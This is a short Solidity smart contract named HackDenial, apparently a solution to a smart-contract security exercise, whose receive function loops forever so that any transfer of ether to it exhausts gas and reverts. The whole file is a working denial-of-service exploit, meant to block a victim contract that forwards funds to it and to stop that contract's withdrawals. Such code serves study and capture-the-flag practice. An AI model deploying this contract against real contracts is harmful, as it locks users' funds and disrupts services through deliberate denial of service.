// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @dev In the receive fct just loop with a while inf and the transaction will revert.
contract HackDenial {

    // allow deposit of funds
    receive() external payable {
        while (true) {}
    }

}